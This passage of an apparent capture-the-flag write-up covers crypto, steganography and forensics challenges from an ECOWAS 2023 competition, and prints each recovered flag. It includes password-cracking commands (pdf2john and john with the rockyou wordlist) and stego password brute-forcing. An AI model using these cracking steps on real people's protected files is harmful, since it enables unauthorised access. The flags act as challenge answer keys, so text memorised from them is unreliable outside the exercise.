str_ = '''11000110 11001011 10010111 11001011 11010111 11001001 10001101 10011011 10001101 10111010 11000101 10010101 11001001 11010110 11011100 11000011 10111001 10110101 10111001 10111110 11001110 10011010 10100001 10011010 11010011 11000010 10111111 10100100 11010111 11000001 10111111 11000011 11010100 11010100 10100111 11000001 11011010 11001101 11001101 10010100 10111100 10110000 11010000 10011001 10110010 10111101 11010000 10111001 10100001 10110100 11001111 10110000 10010010 10110000 10010000 11001101 10011011 11001111 10101000 10010101 11001101 10011001 10011110 11011101 10101010 10111010 11010101 11010010 11011110 10001100 10111000 11011000 10100100 11001000 10100111 11001110 11010011 10011110 11000111 10111011 10111011 11010010 11000110 10001110 10101100 11001110 11010001 10011100 10111000 11011011 10111111 11001000 10101111 11010010 11010001 11001000 10101110 11011101 10100000 11011100 10111110 11001011 10010000 10100101 10011000 10111111 10101010 10101010 10001010 10100111 11000001 11011101 11011110 10100111 11001110 11000011 11011001 10101100 10100011 10110001 11001001 10101001 10101011 11000101 10110001 11001101 10110100 10011111 10100000 11001111 10111110 10010001 10100111 10101111 11011011 11001101 10011011 11001110 11000011 11010011 11000010 10011111 10110101 10100100 10010111 11001001 10101100 10101001 10101100 10011100 10111011 10011001 10110110 10101110 10010111 11000110 10011010 10001111 10100111 11011110 10111010 10111110 10001111 11001001 10100001 11001100 11010110 11011101 11001000 11001010 11000111 11001010 10111100 10001100 10100100 10111101 10101111 10100000 11001100 10010111 11001000 10001110 10110111 10010101 11000000 11001000 10001101 10111011 10010101 11010101 11000011 11011001 10010001 11010010 11010001 11001110 10011010 10010111 10110000 10001100 11001010 10001011 11001010 10100010 10001111 10111101 10110101 10001101 10110110 10110000 10111011 10110011 11010011 11010000 11000011 11000001 11011000 10110001 10010100 10101010 10111000 10100011 10110010 11011010 10110001 10111011 11010110 11011100 10010010 11000000 11000110 11001100 11010011 10011101 10110001 10111100 10011011 10110001 11000100 11000101 11001100 11010010 10111110 11010100 10010101 11000011 11010110 11010001 11001000 10101100 10111100 11010001 10101010 11001001 10100001 10111001 11011010 10101100 10010011 11011011 10111001 11011000 11011110 10101011 10101111 11001101 10011100 10110001 10100100 11010000 11000011 11010011 10111001 10111111 11000110 11000111 10101110 10101011 10010001 10111011 10111001 11011001 10101110 11001011 10110001 11001100 10111110 10100111 11010000 10100000 11001101 11010011 10111111 11010111 10011001 10111011 10111001 11010010 10011000 11001110 11000001 11011101 10011000 10010001 10010110 10111010 10111110 10111100 11010101 10101011 11001000 10101101 10100000 10101110 11001110 10111111 10101000 11000010 11000010 10100000 10111011 11010100 10101100 11000111 10110011 10111000 10001100 10001010 10010010 10011101 11000010 10100010 10101101 11001011 10110100 11000110 10101110 10100111 10010000 11001010 10111010 11011001 10010111 10010000 10110010 11000110 10010110 10001100 10010001 11000000 10111101 10110001 10100010 11010001 10010100 11000001 11011011 11001010 11000000 10110110 11001110 11010001 11010011 11011001 11000011 10111001 10100011 10100110 10011010 11010010 11000110 10010011 10100110 10111011 10110110 10111111 11000111 10111101 10101110 10010100 10111001 10011111 10001110 10011010 11011100 11001101 10011110 10110100 10010011 11010100 10111101 10110010 10011000 10011111 10100010 11001111 10110001 10100001 10010111 10011111 11001001 11000111 11001110 10010111 10011111 11000111 11000111 10101000 11001001 11001101 10111010 10011100 11010100 10010011 10101111 11000100 10111000 10010000 10110101 10001110 10111010 10111010 11001001 10011000 10111111 10111110 10010100 10100100 11000100 10011100 11001100 10111100 11000000 10111000 10101001 10111100 11001100 10110000 10010011 10110110 10111111 10101010 10001110 11000000 11001000 10111000 11011010 10101111 10101000 11001000 11000100 10111001 10010101 10101111 10101111 11001101 10011110 10001111 11001101 11010011 11001101 10111010 11001010 10100000 10110011 10111011 10011010 11001101 11000010 11001011 11000001 11011101 10101000 11001001 10010000 11001100 11010100 10100110 10101000 10100110 10110111 11011100 11011100 10011001 10110010 11001001 11011101 11000100 10011100 10011111 10111000 10100100 10001101 10101010 10110011 10111001 11010111 11011001 11010101 11010100 11001101 10111000 11001000 10101101 10110001 11001110 10110100 10011100 10111011 10111000 11000100 11001111 10101101 11001000 10011111 10111100 10110010 10010011 10001111 10010000 11000111 10101111 11010110 10101000 10110101 10111000 11011100 10110001 11011011 10010111 10110111 11011100 10101101 10010111 11010101 10111101 11001001 11011010 11001111 10011101 10111100 11001110 10010111 11011000 10110011 10111011 10011111 10110010 11000011 10101101 11000011 10100010 11010101 10101000 11000011 11001100 11010010 10110100 11010111 10110011 10111001 10111111 11001111 10101111 10110010 10111011 11010111 10001010'''
# print(str_)
not_result = swap(str_)

print(not_result)
```

Running it gives the `NOT` value
![image](https://github.com/markuched13/CTFLearn/assets/113513376/3453d332-83b2-40d3-9b45-91be5df81198)

Also cyberchef can do `NOT` operation but we had no idea that's why we went ahead writing a script
![image](https://github.com/markuched13/CTFLearn/assets/113513376/c42cdbef-2f5f-4346-ad3f-5f88a991dec9)

Now on decoding that NOTed value with cyberchef and using the MAGIC function we got this
![image](https://github.com/markuched13/CTFLearn/assets/113513376/37623d9b-e53c-4aa7-804e-9bee579dc608)

Since I had no idea what that is I used `dcodefr` to identify it
![image](https://github.com/markuched13/CTFLearn/assets/113513376/ed64c112-ceb1-4a71-b467-4729defaea85)

Ok it's base62 encoding

I decoded that from cyberchef and got this ASCII decimal values
![image](https://github.com/markuched13/CTFLearn/assets/113513376/9e6166cf-f2d8-4ec2-b493-ad03ff44afa7)

Further decoding using the magic function reached here
![image](https://github.com/markuched13/CTFLearn/assets/113513376/38544e08-2a40-4b02-9936-dff8c06edf27)

```
Note: When I tried decoding that ASCII decimal representation value it got us into rabbit hole for a while 🥲
```

Anyways what the hell is this:

```
hbaa{{@A027B:42?@A0?646F:A2?04@=23@A2I0O04U646N0;S?L@Y}
```

I noticed that this people love ROT47 (from the steg chall btw) so I tried converting it from that and got this
![image](https://github.com/markuched13/CTFLearn/assets/113513376/c7c0f47f-3266-461f-b0e3-1f8589c11c0c)

It kinda seems like `africa` but it isn't complete

This is were the main issue was decoding that value

After hours of trying various online tools like dcodefr, boxentriq etc. 

It couldn't identify that

So this is were guessing kinda comes in 

Using [this](https://book.hacktricks.xyz/crypto-and-stego/crypto-ctfs-tricks](https://book.hacktricks.xyz/crypto-and-stego/crypto-ctfs-tricks) and yea trying them all 💀

You will get that `Bifid` cipher looks interesting because it starts with `flag{`
![image](https://github.com/markuched13/CTFLearn/assets/113513376/92537827-d92a-46ba-9b62-f305bccc3359)

I then used ROT47 which then decoded to the flag
![image](https://github.com/markuched13/CTFLearn/assets/113513376/f9bf78d8-aa95-42cb-963a-1f8e8b7f0d3f)

```
Flag: flag{Los_africanos_necesitan_colaborar_x_crecer_juntos}
```

The process was really tedious but interesting 🙂

#### Spot Terrorist Secret Message
![image](https://github.com/markuched13/CTFLearn/assets/113513376/39ef207b-32c9-45a6-b9c0-35654ee94bfd)

This was kinda the challenge that determined which team qualify 

Was happy when we did it 🙏

It wasn't all that hard and I wouldn't say guessy also

Let's get to it 😜

Downloading the attached file shows it's an image file
![image](https://github.com/markuched13/CTFLearn/assets/113513376/6a6bed5b-ff35-4227-bf5c-59684f29ab16)

From the image we can see the ECOWAS based countries

I first tried using steghide with no password but it didn't get anything

Since those are country flags on the image I tried using the password as the Alpha2Code representation but that didn't work

After few hours we got the password to be `ECOWAS`
![image](https://github.com/markuched13/CTFLearn/assets/113513376/7dcd628e-eaa9-4899-87dd-baeba529ef77)

From the look of the extracted file we can immediately tell it's StegSnow

I tried if I could get the plaintext but that didn't work
![image](https://github.com/markuched13/CTFLearn/assets/113513376/f613dab9-c747-4c3d-9c45-c7d2afab2c16)

So this needs a password

But this is where the issue began

We spent so many hours trying to brute force the stegsnow password but rockyou was so large and was taking so much time and you can tell from my cwd I also was trying various stuff in order to get the stegsnow password
![image](https://github.com/markuched13/CTFLearn/assets/113513376/511bcb81-339a-4f92-9ca8-17d73c878d58)

Eventually after the trial and stuffs we then tried to use combinations of the CTF name

Since the steghide password was ECOWAS, we tried various combination like ECOWAS, ecowas, 3c0w45 etc.

And eventually we got it to be `ECOWAS2023` at this point we all looked dumb 😿

So on decoding that stegsnow we got this binary value
![image](https://github.com/markuched13/CTFLearn/assets/113513376/072fecff-ef60-43c2-9736-325ebd1dac7b)

Decoding that from cyberchef gives this
![image](https://github.com/markuched13/CTFLearn/assets/113513376/b2f45f5b-5c50-4998-8523-4510ca0267dd)

```
⠥⠨⠉⠢⠑⠉⠁⠟⠋⠤⠒⠑⠍⠒⠙⠊⠑⠉⠴⠩⠑⠊⠑⠉⠀⠑⠙⠋⠌⠙⠝⠲⠲⠍⠤⠙⠫⠋⠋⠖⠩⠑⠟⠲⠲⠴⠫⠉⠛⠑⠉⠡⠏⠙⠤⠚⠉⠙⠵⠉⠂⠑⠉⠱⠦⠙⠔⠫⠉⠴⠫⠉⠂⠫⠉⠞⠥⠑⠵⠆
```

From that we can immediately tell it's Braille cipher

I used cyberchef to decode it
![image](https://github.com/markuched13/CTFLearn/assets/113513376/4693f01e-38d7-4e63-ac4f-a23aa1837735)

```
U.C5ECAQF-3EM3DIEC0%EIEC EDF/DN44M-D$FF6%EQ440$CGEC*PD-JCDZC1EC:8D9$C0$C1$CTUEZ2
```

Since I have no idea what that is I used dcodefr to identify it
![image](https://github.com/markuched13/CTFLearn/assets/113513376/f60c40a4-4966-442c-8a78-bee84f62f3f0)

Cool it's base45 decoding from cyberchef gives the flag
![image](https://github.com/markuched13/CTFLearn/assets/113513376/4f72235e-6ac4-4217-b955-f5fdd34ba801)

```
flag{Congratulations on your remarkable achievement!}
```

### Forensics 9/9

#### Fairy Tale
![image](https://github.com/markuched13/CTFLearn/assets/113513376/9ff62b84-e42f-49ba-8c98-fad2cee99b00)

Downloading the attached file and checking it's file type shows it's a zip file
![image](https://github.com/markuched13/CTFLearn/assets/113513376/1b6235cf-c756-4407-bd8c-98906fc1d317)

When I tried unzipping I got this error
![image](https://github.com/markuched13/CTFLearn/assets/113513376/7cae3fc7-1c26-4791-8aab-5e3d8edf68a1)

If we take a look at the hex header we can see that it's been modified to that of a PDF file
![image](https://github.com/markuched13/CTFLearn/assets/113513376/64544083-2f01-4523-b073-b5a06274c96b)

So I changed: `25 50 44 46` to the file signature of a ZIP file `50 4B 03 04` using hexeditor
![image](https://github.com/markuched13/CTFLearn/assets/113513376/c4865ae2-f9ad-4b77-9605-5f83e5e0ef28)

Viewing the image gives this
![image](https://github.com/markuched13/CTFLearn/assets/113513376/35ff586b-cb36-40bf-bdfa-b53d989ab3db)

We can decode that using cyberchef
![image](https://github.com/markuched13/CTFLearn/assets/113513376/09e86183-694d-4271-b5c4-3e86ef634ec0)

```
EcoWasCTF{oNe_CuTe_CaT!}
```

And yes I wrote those hex values manually 💀 though we can use tesseract or python PIL library to extract the text from the image but uhh who wants to do that when pressure is everywhere lol 😂

#### Etikonam
![image](https://github.com/markuched13/CTFLearn/assets/113513376/48ab5211-3754-4aa4-ad68-0108e40aa3c9)

Downloading the file attached and checking the file type shows this
![image](https://github.com/markuched13/CTFLearn/assets/113513376/5dff5fd9-a8dc-435e-96a8-fec9cc9aad38)

Ok we can see that it contains PNG file from the result of `binwalk`

So I extracted it
![image](https://github.com/markuched13/CTFLearn/assets/113513376/5d73d1f1-0075-41ad-8603-de80f2d11f05)

```r
binwalk --dd='.*' Etikonam.zip
```

On viewing the PNG file gave the flag

```
Flag: flag{help_im_stuck_at_the_pet_store}
```

#### Where is my Flash
![image](https://github.com/markuched13/CTFLearn/assets/113513376/9a4d8128-c691-4efa-bf25-c6b80a78885c)

Downloading the attached file and checking the file type shows this
![image](https://github.com/markuched13/CTFLearn/assets/113513376/ff392fc2-9926-4a35-b544-284dca9c725a)

From the challenge title the ideal thing to do is maybe find a way to mount it since it's referring to `Flash Drive` then check for the things there

But I didn't do that

I used `foremost` to extract what it can from the file

And from that result it shows `password.txt` which looks interesting to check
![1](https://github.com/markuched13/CTFLearn/assets/113513376/d351878b-45cf-4880-b219-d2f5f54531cb)

```
foremost -i lost_flash_drive
```

Looking through the audit it extracted 17 files
![1](https://github.com/markuched13/CTFLearn/assets/113513376/d471ebb6-9d58-465b-b8c5-73164aee0433)

The file names are all given here
![1](https://github.com/markuched13/CTFLearn/assets/113513376/22ae8b35-7004-4209-8c43-cd404d2a8f1c)

Ok the files there are interesting
![1](https://github.com/markuched13/CTFLearn/assets/113513376/bda4d054-3ba2-4cf8-8d0b-166abc442ba6)

Most of them are `jpegs` so I'm not checking em out

But on checking that peculiar zip file I got this
![1](https://github.com/markuched13/CTFLearn/assets/113513376/1a56f39c-c123-42d4-b6b9-908ce0970054)

A `password.txt` file!! I'll unzip this since that looks interesting

Doing that and reading the file I got the flag
![1](https://github.com/markuched13/CTFLearn/assets/113513376/78594adf-13ba-422f-bc11-79b6c64d27b0)

```
Flag: flag{its_adventure_time_yee_boi!!!}
```

#### Assini
![image](https://github.com/markuched13/CTFLearn/assets/113513376/2966f585-87bb-451c-867d-d50008cbad22)

After downloading the file and checking the file type I got that it's a pdf file
![image](https://github.com/markuched13/CTFLearn/assets/113513376/31f8831e-ea15-48b1-93eb-d918f13ab43c)

Trying to open it requires a password
![image](https://github.com/markuched13/CTFLearn/assets/113513376/098f8565-3fa5-466d-b8fd-94c50e391540)

So I brute forced the password using John The Ripper
![image](https://github.com/markuched13/CTFLearn/assets/113513376/c2c29703-402b-42e0-b751-d13280f47149)

```
- pdf2john Assini > hash
- john -w=/usr/share/wordlists/rockyou.txt hash
```

The password for the pdf is `hacked`

Using it worked and I got the flag
![image](https://github.com/markuched13/CTFLearn/assets/113513376/fc2ba0be-78ee-4ef7-9e92-e507f60389bf)

```
Flag: flag{kramer_the_best_hacker_ever}
```

#### Zangbeto
![image](https://github.com/markuched13/CTFLearn/assets/113513376/2356bd73-f748-418e-b6da-a3aa5c95435a)

Downloading the file and checking it's file type shows this
![image](https://github.com/markuched13/CTFLearn/assets/113513376/e601b455-5b08-4d2f-9e4c-7ee9aac842a3)

After unzipping it I got this
![image](https://github.com/markuched13/CTFLearn/assets/113513376/55df7d7f-5a84-4f95-9102-48e483bbe43f)

So it's actually a word document file

I used grep to find the flag

Out of luck I tried that and it worked lol
![image](https://github.com/markuched13/CTFLearn/assets/113513376/5032d7e8-8f92-4d21-b5a3-9dc48fca7850)

```
Flag: flag{old_macdonald_or_mcdonalds_supplier}
```

#### A Peculiar Email
![image](https://github.com/markuched13/CTFLearn/assets/113513376/54c1908a-8851-47b8-9865-bae1ac223629)

Downloading the attached file and checking it's content shows this
![image](https://github.com/markuched13/CTFLearn/assets/113513376/9ec10e7b-aed5-414f-be3f-4e1bd977a6d5)

Since the challenge was referring to spam mail I researched and found this [site](https://www.spammimic.com/decode.shtml)

Using that I decoded the spam mail got the flag

```
Flag: flag{Why do you have an affinity for concealed matters? Proceed and confess!}
```

#### Sentinnelle
![image](https://github.com/markuched13/CTFLearn/assets/113513376/2e0b588e-a052-4dc4-8fff-dfd1c29b6606)

After downloading the file attached showed it's a `JPEG` file
![image](https://github.com/markuched13/CTFLearn/assets/113513376/fa3b039f-9543-4a33-ae23-65624845cba8)

Next thing I tried was to view it
![image](https://github.com/markuched13/CTFLearn/assets/113513376/fe0f86d2-e21c-49b4-9c3f-555bafde8009)

A black and white photo

I first used stegsolve and changed to various colour offsets maybe the flag is hiding in another offset but it wasn't

Running steghide didn't extract anything without a password provided
![image](https://github.com/markuched13/CTFLearn/assets/113513376/002ab84b-7ed6-419a-a06c-ef335fc20d5e)

Since we don't know the password I decided to try crack it using `stegseek`

Doing that worked and got an extracted `.wav` file
![image](https://github.com/markuched13/CTFLearn/assets/113513376/1952294e-c65e-47cb-94c4-3366378b1ed2)

When I listened to it I was sure it was morse code

But on decoding showed it's a troll 😹
![1](https://github.com/markuched13/CTFLearn/assets/113513376/b0472684-286e-4c35-9759-636991ddcf00)

At this point I decided to try using Audacity to look at spectogram but it didn't give anything

I also tried LSB Steg on both the image and the wav file & stegsolve but got nothing

After hours of trying random things I saw online and none worked 

I took a quick nap to calm my nerves cause I find it better to solve things when I'm calm

When I woke up I decided to check strings for low hanging fruits 👀
![image](https://github.com/markuched13/CTFLearn/assets/113513376/dd5c5f13-4cd9-4133-9907-cd5f2089e7b7)
![image](https://github.com/markuched13/CTFLearn/assets/113513376/97529ef1-d908-417b-bb51-1ff1bd154d19)

Nothing there looks out of the ordinary but you'll notice most of them are of same length

Next I tried search which string has at least length of 10
![image](https://github.com/markuched13/CTFLearn/assets/113513376/110e3a3a-285a-450e-a772-30c78592887b)

Only those string are quite different from the rest

I used dcodefr to identify it and got this
![1](https://github.com/markuched13/CTFLearn/assets/113513376/176cc9da-e1d5-4ac7-812a-31b29980d3a3)

It found possible encryption schema likely used 

The first one doesn't give anything but the second (ROT47) does
![1](https://github.com/markuched13/CTFLearn/assets/113513376/86a02c79-49ee-489b-9464-980f18e2d4e9)

That was really guessy but anyways we have the flag 🙂

```
Flag: EcoWasCTF{fRl38JWTwHInm2oAoVDNomaReoVp}
```

#### Yaa Asantewa
![image](https://github.com/markuched13/CTFLearn/assets/113513376/2988744b-a711-4ad6-896c-dbcc95d7530a)

We are given a zip file that contains 5 files
![image](https://github.com/markuched13/CTFLearn/assets/113513376/134da418-0a2c-461f-8388-836aaf4014f5)

Trying to unzip it requires a password
![image](https://github.com/markuched13/CTFLearn/assets/113513376/1ba52f52-f60d-436c-8a28-d1495215dd80)

So I brute forced it using JTR
![image](https://github.com/markuched13/CTFLearn/assets/113513376/d918b579-6436-4318-9b58-61fc0ff2c974)

The password is `096630060`

Unzipping it gives 5 files where 4 are images and the last one is a RAR file
![image](https://github.com/markuched13/CTFLearn/assets/113513376/c45cc375-d933-4634-9e0b-cb036a845ae2)

From the challenge description we are to find the secrets and piece them all together

For the first image `hollow_mech.webp` checking `strings` gave this
![image](https://github.com/markuched13/CTFLearn/assets/113513376/e3aaef65-0c75-4000-88de-9efadc1a06c2)

We can see the base64 encoded value `VGhlIGZpcnN0IHNlY3JldCA6IFJpc2luZw==`

Decoding it gives the first secret
![image](https://github.com/markuched13/CTFLearn/assets/113513376/b65c012e-b5a9-49e5-bc18-512a5e18ac84)

```
The first secret : Rising
```

Viewing it shows this cool hollow but the image is scrammbled at another offset
![1](https://github.com/markuched13/CTFLearn/assets/113513376/b9e00ae3-ebc4-421a-9759-88c6db84a648)

The second image `layered.jpg` has this comment in the meta data
![image](https://github.com/markuched13/CTFLearn/assets/113513376/70f54f31-53fc-4a54-8396-3aa738363053)

We can tell that's a hash

I used crackstation to decode it
![image](https://github.com/markuched13/CTFLearn/assets/113513376/b76e634e-e178-42e8-bd5c-bd201e1e230c)

```
Second secret: as
```

Checking it also shows this cool hollow
![1](https://github.com/markuched13/CTFLearn/assets/113513376/124f8e22-cebc-4f3c-b7b2-3cba33ebd1b3)

The third image gave this when I ran `strings` on it
![image](https://github.com/markuched13/CTFLearn/assets/113513376/1254fe25-bd52-4b66-9f7e-f211aac6d7ab)

```
➜  src strings realmente_.png -n 20
_``_````_``_```__``__`_`__`_``__
➜  src
```

We can tell that's just two repeated patterns

Converting them to zero's and one's gave this
![image](https://github.com/markuched13/CTFLearn/assets/113513376/c3aac5a8-8029-4c79-8db8-129b7c7b5d29)

```
Third secret: one,
```

Viewing it showed this
![1](https://github.com/markuched13/CTFLearn/assets/113513376/3e82abfe-9135-43eb-82d8-00bf48319edd)

You can tell there's a word in that image that says `shines`

```
Fourth secret: shines
```

The last image which is the fourth one holds the 5th secret

And to get it ........

```
Fifth secret: Africa
```

Joining all the secret together to a readable word gave this:

```
Flag: EcoWasCTF{Rising as one, Africa shines}
```

And that's all `(　-_･)σ - - - - - - - `

After all the struggle and pain of waiting 1AM / 1PM daily the ctf ended and hopefully we qualified 🙏
![image](https://github.com/markuched13/CTFLearn/assets/113513376/7284a318-806e-4687-bbb6-7b5ba60a95a3)

